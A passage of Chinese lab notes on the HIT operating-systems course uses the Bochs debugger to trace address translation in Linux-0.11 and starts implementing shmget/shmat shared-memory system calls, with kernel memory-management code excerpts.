<li>用 Bochs 调试工具跟踪 Linux-0.11 的地址翻译(地址映射)过程，了解 IA-32(Intel Architecture 32-bit) 的CPU架构下的地址翻译</li>
<li>在 Linux-0.11 中实现 Linux-0.11 的内存管理机制，具体来说就是实现如下3个系统调用：<ul>
<li>sys_shmget：获取一个共享内存块</li>
<li>sys_shmat：映射一个共享内存块</li>
</ul>
</li>
<li>在 Ubuntu 上编写多进程的生产者-消费者程序，用共享内存做缓冲区（上一个实验是用文件做缓冲区）</li>
<li>在上一个实验（信号量的实现和在 pc.c 程序上的应用）的基础上，为 Linux-0.11 增加共享内存功能，并将生产者-消费者程序移植到 Linux-0.11</li>
</ul>
<p><strong>实验过程</strong></p>
<p>本实验基于上个实验，因此需要保存上个实验的代码</p>
<p>逻辑地址，虚拟地址，线性地址，物理地址是计算机内存管理中的重要概念：</p>
<ul>
<li>逻辑地址：<ul>
<li>逻辑地址是程序使用的地址</li>
<li>编译器编译程序时，会为程序生成代码段和数据段，然后将所有代码放到代码段中，将所有数据放到数据段中，最后程序中的每句代码和每条数据都会有自己的逻辑地址 </li>
</ul>
</li>
<li>虚拟地址：<ul>
<li>虚拟地址是操作系统为每个进程分配的地址空间，保证了进程之间的隔离和安全性</li>
</ul>
</li>
<li>线性地址：<ul>
<li>由虚拟地址通过 “分段” / “分页” 机制转换而来的地址</li>
</ul>
</li>
<li>物理地址：<ul>
<li>物理地址是指内存中的实际地址，它是硬件访问的地址</li>
<li>如果 CPU 没有分页机制，那么线性地址等于物理地址 </li>
<li>如果 CPU 有分页机制，那么线性地址必须通过转换才能变成物理地址</li>
</ul>
</li>
</ul>
<p>逻辑地址，虚拟地址，线性地址，物理地址之间的关系是：</p>
<ul>
<li>在程序编写时，汇编指令使用的地址为逻辑地址（编译器为各个符号分配的地址）</li>
<li>当程序被加载到内存中时，操作系统会将逻辑地址转化为虚拟地址</li>
<li>在 x86 架构中：<ul>
<li>虚拟地址通过段选择器和段描述符转化为线性地址</li>
<li>线性地址通过页表转化为物理地址</li>
</ul>
</li>
</ul>
<p>实验要求跟踪调试 Linux-0.11 的地址映射过程，测试代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0x12345678</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;LQD The logical/virtual address of i is 0x%08x&quot;</span>, &amp;i);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (i);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>运行后程序死循环</li>
</ul>
<p>我们的目标就是调试分析变量 i 的物理地址，修改该地址使程序停止死循环：</p>
<img src="/2023/11/08/HIT-OSLab6/1699297121439.png" class width="1699297121439">  
<ul>
<li>程序运行之后输出的 0x3004 就是变量 i 的虚拟地址</li>
</ul>
<p>线性地址由段选择器和段描述符计算而来，因此我们需要先查找到段描述符</p>
<p>进程的段描述符记录在该进程的 LDT 表中，而 LDT 表则记录在 GDT 表中（LDTR 寄存器记录 LDT 表存放在 GDT 表的位置，GDTR 寄存器则记录有 GDT 表的物理地址）</p>
<p>用 <code>sreg</code> 命令可以显示所有寄存器的信息：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;bochs:<span class="number">3</span>&gt; sreg</span><br><span class="line">es:<span class="number">0x0017</span>, dh=<span class="number">0x10c0f300</span>, dl=<span class="number">0x00003fff</span>, valid=<span class="number">1</span></span><br><span class="line">	Data segment, base=<span class="number">0x10000000</span>, limit=<span class="number">0x03ffffff</span>, Read/Write, Accessed</span><br><span class="line">cs:<span class="number">0x000f</span>, dh=<span class="number">0x10c0fb00</span>, dl=<span class="number">0x00000002</span>, valid=<span class="number">1</span></span><br><span class="line">	Code segment, base=<span class="number">0x10000000</span>, limit=<span class="number">0x00002fff</span>, Execute/Read, Non-Conforming, Accessed, <span class="number">32</span>-bit</span><br><span class="line">ss:<span class="number">0x0017</span>, dh=<span class="number">0x10c0f300</span>, dl=<span class="number">0x00003fff</span>, valid=<span class="number">1</span></span><br><span class="line">	Data segment, base=<span class="number">0x10000000</span>, limit=<span class="number">0x03ffffff</span>, Read/Write, Accessed</span><br><span class="line">ds:<span class="number">0x0017</span>, dh=<span class="number">0x10c0f300</span>, dl=<span class="number">0x00003fff</span>, valid=<span class="number">3</span></span><br><span class="line">	Data segment, base=<span class="number">0x10000000</span>, limit=<span class="number">0x03ffffff</span>, Read/Write, Accessed</span><br><span class="line">fs:<span class="number">0x0017</span>, dh=<span class="number">0x10c0f300</span>, dl=<span class="number">0x00003fff</span>, valid=<span class="number">1</span></span><br><span class="line">	Data segment, base=<span class="number">0x10000000</span>, limit=<span class="number">0x03ffffff</span>, Read/Write, Accessed</span><br><span class="line">gs:<span class="number">0x0017</span>, dh=<span class="number">0x10c0f300</span>, dl=<span class="number">0x00003fff</span>, valid=<span class="number">1</span></span><br><span class="line">	Data segment, base=<span class="number">0x10000000</span>, limit=<span class="number">0x03ffffff</span>, Read/Write, Accessed</span><br><span class="line">ldtr:<span class="number">0x0068</span>, dh=<span class="number">0x000082fe</span>, dl=<span class="number">0x92d00068</span>, valid=<span class="number">1</span></span><br><span class="line">tr:<span class="number">0x0060</span>, dh=<span class="number">0x00008bfe</span>, dl=<span class="number">0x92e80068</span>, valid=<span class="number">1</span></span><br><span class="line">gdtr:base=<span class="number">0x0000000000005cb8</span>, limit=<span class="number">0x7ff</span></span><br><span class="line">idtr:base=<span class="number">0x00000000000054b8</span>, limit=<span class="number">0x7ff</span></span><br></pre></td></tr></table></figure>
<ul>
<li>GDTR 寄存器中的值为 0x5cb8</li>
<li>LDTR 寄存器中的值为 0x0068</li>
<li>DS 寄存器中的值为 0x0017（<code>0b000000000010111</code>，索引值为 <code>0b10</code>）</li>
</ul>
<p>用 <code>xp</code> 命令可以打印指定内存的数据：</p>
<ul>
<li>查看 GDT 表信息，LDT 表的物理地址为 <code>0xfe92d0</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;bochs:<span class="number">5</span>&gt; xp /<span class="number">8</span>w <span class="number">0x00005cb8</span>+<span class="number">0x68</span></span><br><span class="line">[bochs]:</span><br><span class="line"><span class="number">0x0000000000005d20</span> &lt;bogus+       <span class="number">0</span>&gt;:	<span class="number">0x92d00068</span>	<span class="number">0x000082fe</span>	<span class="number">0xb2e80068</span>	<span class="number">0x000089f8</span></span><br><span class="line"><span class="number">0x0000000000005d30</span> &lt;bogus+      <span class="number">16</span>&gt;:	<span class="number">0xb2d00068</span>	<span class="number">0x000082f8</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br></pre></td></tr></table></figure>
<ul>
<li>查看对应 LDT 表信息，DS 段的索引为 <code>0x2</code>，对应 <code>0x00003fff    0x10c0f300</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;bochs:<span class="number">6</span>&gt; xp /<span class="number">8</span>w <span class="number">0xfe92d0</span></span><br><span class="line">[bochs]:</span><br><span class="line"><span class="number">0x0000000000fe92d0</span> &lt;bogus+       <span class="number">0</span>&gt;:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000002</span>	<span class="number">0x10c0fb00</span></span><br><span class="line"><span class="number">0x0000000000fe92e0</span> &lt;bogus+      <span class="number">16</span>&gt;:	<span class="number">0x00003fff</span>	<span class="number">0x10c0f300</span>	<span class="number">0x00000000</span>	<span class="number">0x00fea000</span></span><br></pre></td></tr></table></figure>
<p>段描述符的结构如下：</p>
<img src="/2023/11/08/HIT-OSLab6/1699298535080.png" class width="1699298535080"> 
<ul>
<li>段基址由3部分组合而成：<code>[0,8)，[24,32)，[48,64)</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bin(<span class="number">0x00003fff10c0f300</span>) =&gt;</span><br><span class="line"><span class="number">0b</span>[<span class="number">0000000000000000</span>]<span class="number">0011111111111111</span>[<span class="number">00010000</span>]<span class="number">1100000011110011</span>[<span class="number">00000000</span>]</span><br></pre></td></tr></table></figure>
<ul>
<li>计算得基地址为 <code>0x10000000</code></li>
<li>因此线性地址为 <code>0x10003004</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">1</span>]: hex(<span class="number">0b00010000000000000000000000000000</span>)</span><br><span class="line">Out[<span class="number">1</span>]: <span class="string">&#x27;0x10000000&#x27;</span></span><br></pre></td></tr></table></figure>
<p>用 <code>calc</code> 命令验证线性地址是否正确：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;bochs:<span class="number">7</span>&gt; calc ds:<span class="number">0x3004</span></span><br><span class="line"><span class="number">0x10003004</span> <span class="number">268447748</span></span><br></pre></td></tr></table></figure>
<p>线性地址的结构如下：</p>
<img src="/2023/11/08/HIT-OSLab6/1699319659335.png" class width="1699319659335"> 
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bin(<span class="number">0x10003004</span>) =&gt;</span><br><span class="line"><span class="number">0b</span>[<span class="number">1000000</span>][<span class="number">0000000011</span>][<span class="number">000000000100</span>]</span><br></pre></td></tr></table></figure>
<ul>
<li>0-11：页内偏移 - 4</li>
<li>12-21：页表索引 - 3</li>
<li>22-31：页目录索引 - 64（二级页表索引）</li>
</ul>
<p>在 IA-32(英特尔的32位CPU架构) 下，页目录表的位置由 CR3 寄存器指引，用 <code>creg</code> 命令可以看到：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;bochs:<span class="number">2</span>&gt; creg</span><br><span class="line">CR0=<span class="number">0x8000001b</span>: PG cd nw ac wp ne ET TS em MP PE</span><br><span class="line">CR2=page fault laddr=<span class="number">0x0000000010002fb0</span></span><br><span class="line">CR3=<span class="number">0x000000000000</span></span><br><span class="line">    PCD=page-level cache disable=<span class="number">0</span></span><br><span class="line">    PWT=page-level write-through=<span class="number">0</span></span><br><span class="line">CR4=<span class="number">0x00000000</span>: cet pke smap smep osxsave pcid fsgsbase smx vmx osxmmexcpt umip osfxsr pce pge mce pae pse de tsd pvi vme</span><br><span class="line">CR8: <span class="number">0x0</span></span><br><span class="line">EFER=<span class="number">0x00000000</span>: ffxsr nxe lma lme sce</span><br></pre></td></tr></table></figure>
<ul>
<li>页目录表所在物理地址为 <code>0x0</code></li>
<li>页目录表和页表中的内容很简单，是1024个32位数，这32位中前20位是物理页框号，后面是一些属性信息（最重要的是最后一位P）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;bochs:<span class="number">4</span>&gt; xp /<span class="number">8</span>w <span class="number">0</span>+<span class="number">64</span>*<span class="number">4</span></span><br><span class="line">[bochs]:</span><br><span class="line"><span class="number">0x0000000000000100</span> &lt;bogus+       <span class="number">0</span>&gt;:	<span class="number">0x00fa6027</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x0000000000000110</span> &lt;bogus+      <span class="number">16</span>&gt;:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x0000000000000120</span> &lt;bogus+      <span class="number">32</span>&gt;:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br></pre></td></tr></table></figure>
<ul>
<li>页表所在的物理页框号为 <code>0x00fa6</code>，即页表在物理内存为 <code>0x00fa6000</code> 处</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;bochs:<span class="number">5</span>&gt; xp /<span class="number">8</span>w <span class="number">0x00fa6000</span> + <span class="number">3</span>*<span class="number">4</span></span><br><span class="line">[bochs]:</span><br><span class="line"><span class="number">0x0000000000fa600c</span> &lt;bogus+       <span class="number">0</span>&gt;:	<span class="number">0x00f99067</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x0000000000fa601c</span> &lt;bogus+      <span class="number">16</span>&gt;:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br></pre></td></tr></table></figure>
<ul>
<li>物理页所在的物理页框号为 <code>0x00f99</code>，即物理页在物理内存为 <code>0x00f99000</code> 处 </li>
<li>因此变量 i 的物理地址为 <code>0x00f99004</code></li>
</ul>
<p>用 <code>page</code> 命令验证物理地址是否正确：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;bochs:<span class="number">6</span>&gt; page <span class="number">0x10003004</span></span><br><span class="line"> PDE: <span class="number">0x0000000000fa6027</span>    ps         A pcd pwt U W P</span><br><span class="line"> PTE: <span class="number">0x0000000000f99067</span>       g pat D A pcd pwt U W P</span><br><span class="line">linear page <span class="number">0x0000000010003000</span> maps to physical page <span class="number">0x000000f99000</span></span><br></pre></td></tr></table></figure>
<p>打印该地址的数据即可发现 <code>0x12345678</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;bochs:<span class="number">8</span>&gt; xp /w <span class="number">0x00f99004</span></span><br><span class="line">[bochs]:</span><br><span class="line"><span class="number">0x0000000000f99004</span> &lt;bogus+       <span class="number">0</span>&gt;:	<span class="number">0x12345678</span></span><br></pre></td></tr></table></figure>
<p>最后使用 <code>setpmem</code> 命令修改内存即可：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;bochs:<span class="number">10</span>&gt; setpmem <span class="number">0x00f99004</span> <span class="number">4</span> <span class="number">0</span></span><br><span class="line">&lt;bochs:<span class="number">11</span>&gt; xp /w <span class="number">0x00f99004</span></span><br><span class="line">[bochs]:</span><br><span class="line"><span class="number">0x0000000000f99004</span> &lt;bogus+       <span class="number">0</span>&gt;:	<span class="number">0x00000000</span></span><br></pre></td></tr></table></figure>
<img src="/2023/11/08/HIT-OSLab6/1699320824200.png" class width="1699320824200">   
<ul>
<li>程序成功退出</li>
</ul>
<p>Linux 和 Unix 系统中，共享内存（Shared Memory）是一种在多进程环境下实现进程间通信的技术，它允许多个进程同时访问同一块内存区域，从而实现数据的共享和通信</p>
<p>在为 linux-0.11 编写共享内存代码前，我们需要先分析一下 linux-0.11 对页面的管理机制</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGING_MEMORY (15*1024*1024)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGING_PAGES (PAGING_MEMORY&gt;&gt;12)</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> mem_map [ PAGING_PAGES ] = &#123;<span class="number">0</span>,&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>mem_map</code> 是一个全局数组，在 Linux 0.11 中用于存储物理内存的映射</li>
<li>其索引代表线性地址，每个元素代表一个物理页框</li>
</ul>
<img src="/2023/11/08/HIT-OSLab6/1699422373776.png" class width="1699422373776"> 
<p>在 Linux-0.11 中，物理内存由一系列页框组成，每个页框的大小为 4KB，<code>mem_map</code> 数组存储了所有已经分配的物理页框的地址，当进程需要分配内存时，会从 <code>mem_map</code> 中查找一个空闲的页框，将其分配给进程，并将该页框的地址返回给进程</p>
<p>初始化 <code>mem_map</code> 数组的函数为 <code>mem_init</code>，在 swapper 进程中会调用一次：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAP_NR(addr) (((addr)-LOW_MEM)&gt;&gt;12)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> USED 100</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mem_init</span><span class="params">(<span class="keyword">long</span> start_mem, <span class="keyword">long</span> end_mem)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">	HIGH_MEMORY = end_mem;</span><br><span class="line">	<span class="keyword">for</span> (i=<span class="number">0</span> ; i&lt;PAGING_PAGES ; i++)</span><br><span class="line">		mem_map[i] = USED;</span><br><span class="line">	i = MAP_NR(start_mem);</span><br><span class="line">	end_mem -= start_mem;</span><br><span class="line">	end_mem &gt;&gt;= <span class="number">12</span>;</span><br><span class="line">	<span class="keyword">while</span> (end_mem--&gt;<span class="number">0</span>)</span><br><span class="line">		mem_map[i++]=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>空闲页面分配的函数 <code>get_free_page</code> 代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOW_MEM 0x100000</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">get_free_page</span><span class="params">(<span class="keyword">void</span>)</span> <span class="comment">/* 获取一个空闲页 */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">register</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> __res <span class="title">asm</span><span class="params">(<span class="string">&quot;ax&quot;</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">__asm__(<span class="string">&quot;std ; repne ; scasb\n\t&quot;</span> <span class="comment">/* 查找一个末尾为&quot;\0&quot;的page,记录在edi中 */</span></span><br><span class="line">	<span class="string">&quot;jne 1f\n\t&quot;</span>		   <span class="comment">/* 如果scasb指令返回非零值,说明页框已经被占用 */</span></span><br><span class="line">	<span class="string">&quot;movb $1,1(%%edi)\n\t&quot;</span>	<span class="comment">/* [edi+1]=1,对应页面设置为&#x27;1&#x27; */</span></span><br><span class="line">	<span class="string">&quot;sall $12,%%ecx\n\t&quot;</span>	</span><br><span class="line">	<span class="string">&quot;addl %2,%%ecx\n\t&quot;</span></span><br><span class="line">	<span class="string">&quot;movl %%ecx,%%edx\n\t&quot;</span></span><br><span class="line">	<span class="string">&quot;movl $1024,%%ecx\n\t&quot;</span></span><br><span class="line">	<span class="string">&quot;leal 4092(%%edx),%%edi\n\t&quot;</span></span><br><span class="line">	<span class="string">&quot;rep ; stosl\n\t&quot;</span></span><br><span class="line">	<span class="string">&quot;movl %%edx,%%eax\n&quot;</span></span><br><span class="line">	<span class="string">&quot;1:&quot;</span></span><br><span class="line">	:<span class="string">&quot;=a&quot;</span> (__res)</span><br><span class="line">	:<span class="string">&quot;0&quot;</span> (<span class="number">0</span>),<span class="string">&quot;i&quot;</span> (LOW_MEM),<span class="string">&quot;c&quot;</span> (PAGING_PAGES), <span class="comment">/* 设置i为LOW_MEM(从LOW_MEM开始计数) */</span></span><br><span class="line">	<span class="string">&quot;D&quot;</span> (mem_map+PAGING_PAGES<span class="number">-1</span>)</span><br><span class="line">	);</span><br><span class="line"><span class="keyword">return</span> __res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>repne scasb</code> 用于将寄存器的内容与内存中的数据进行比较（一直重复直到 <code>edi</code> 末尾为 “\0”）</li>
<li>核心操作就是遍历一遍 <code>mem_map</code>，返回合适的空闲页面</li>
</ul>
<p>释放已分配页面的函数 <code>get_free_page</code> 代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">free_page</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (addr &lt; LOW_MEM) <span class="keyword">return</span>;</span><br><span class="line">	<span class="keyword">if</span> (addr &gt;= HIGH_MEMORY)</span><br><span class="line">		panic(<span class="string">&quot;trying to free nonexistent page&quot;</span>);</span><br><span class="line">	addr -= LOW_MEM;</span><br><span class="line">	addr &gt;&gt;= <span class="number">12</span>;</span><br><span class="line">	<span class="keyword">if</span> (mem_map[addr]--) <span class="keyword">return</span>;</span><br><span class="line">	mem_map[addr]=<span class="number">0</span>;</span><br><span class="line">	panic(<span class="string">&quot;trying to free free page&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>将对应的 <code>mem_map[addr]</code> 末尾置为 “\x00”</li>
</ul>
<p>函数 <code>put_page</code> 用于将线性地址与物理页进行映射，其实现如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">put_page</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> page,<span class="keyword">unsigned</span> <span class="keyword">long</span> address)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> tmp, *page_table;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* NOTE !!! This uses the fact that _pg_dir=0 */</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (page &lt; LOW_MEM || page &gt;= HIGH_MEMORY)</span><br><span class="line">		printk(<span class="string">&quot;Trying to put page %p at %p\n&quot;</span>,page,address);</span><br><span class="line">	<span class="keyword">if</span> (mem_map[(page-LOW_MEM)&gt;&gt;<span class="number">12</span>] != <span class="number">1</span>)</span><br><span class="line">		printk(<span class="string">&quot;mem_map disagrees with %p at %p\n&quot;</span>,page,address);</span><br><span class="line">	page_table = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *) ((address&gt;&gt;<span class="number">20</span>) &amp; <span class="number">0xffc</span>);</span><br><span class="line">	<span class="keyword">if</span> ((*page_table)&amp;<span class="number">1</span>)</span><br><span class="line">		page_table = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *) (<span class="number">0xfffff000</span> &amp; *page_table);</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> (!(tmp=get_free_page()))</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		*page_table = tmp|<span class="number">7</span>;</span><br><span class="line">		page_table = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *) tmp;</span><br><span class="line">	&#125;</span><br><span class="line">	page_table[(address&gt;&gt;<span class="number">12</span>) &amp; <span class="number">0x3ff</span>] = page | <span class="number">7</span>;</span><br><span class="line"><span class="comment">/* no need for invalidate */</span></span><br><span class="line">	<span class="keyword">return</span> page;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>本实验要求我们实现共享内存，首先我们需要添加共享内存的系统调用号：（在 <code>/include/unistd.h</code> 中）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_shmget		76</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_shmat 		77</span></span><br></pre></td></tr></table></figure>
<ul>
<li>需要注意的是：这里同时需要修改 <code>hdc-0.11.img</code> 中的 <code>hdc/usr/include/unistd.h</code> 文件，如果想在虚拟机中使用 gcc 编译的话，会导入虚拟机 <code>hdc/usr/include/</code> 中的文件为头文件</li>
</ul>
<p>接着修改系统调用号的总数：（在 <code>/kernel/system_call.s</code> 中）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nr_system_calls = <span class="number">78</span></span><br></pre></td></tr></table></figure>
<p>最后添加新的系统调用定义：（在 <code>/include/linux/sys.h</code> 中）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">int</span> <span class="title">sys_shmget</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">void</span> *<span class="title">sys_shmat</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">fn_ptr sys_call_table[] = &#123;......, sys_shmget, sys_shmat&#125;;</span><br></pre></td></tr></table></figure>
<p>头文件以及宏定义：（在 <code>/kernel</code> 中新建文件 <code>shm.c</code>）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/segment.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHM_COUNT 20</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHM_NAME_SIZE 20</span></span><br></pre></td></tr></table></figure>
<p>核心结构体 <code>struct_shm_tables</code>：</p>
